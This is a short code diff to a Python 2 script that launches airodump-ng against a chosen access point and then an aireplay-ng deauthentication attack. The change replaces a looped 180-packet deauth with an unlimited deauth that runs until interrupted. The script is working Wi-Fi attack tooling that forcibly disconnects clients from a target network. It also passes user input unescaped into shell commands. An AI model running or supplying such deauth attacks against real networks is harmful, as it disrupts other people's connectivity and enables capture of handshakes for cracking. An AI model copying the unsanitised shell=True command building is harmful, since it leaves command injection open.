@@ -30,8 +30,6 @@ cmd = "airodump-ng -c " + channel + " --bssid " + bssid + " " + interface
 print "> " + cmd
 subprocess.check_output("gnome-terminal -x sh -c '" + cmd + "; exec bash'" , shell=True)
 x = raw_input("Start aireplay-ng targeted deauth > ")
-cmd = "aireplay-ng --deauth 180 -x 3 -a " + bssid + " -e " + ssid + " " + interface
+cmd = "aireplay-ng --deauth 0 -x 3 -a " + bssid + " -e " + ssid + " " + interface
 print "> Run till interrupt > " + cmd
-while True:
-    subprocess.Popen(cmd , shell=True)
-    time.sleep(60)
+subprocess.Popen(cmd , shell=True)
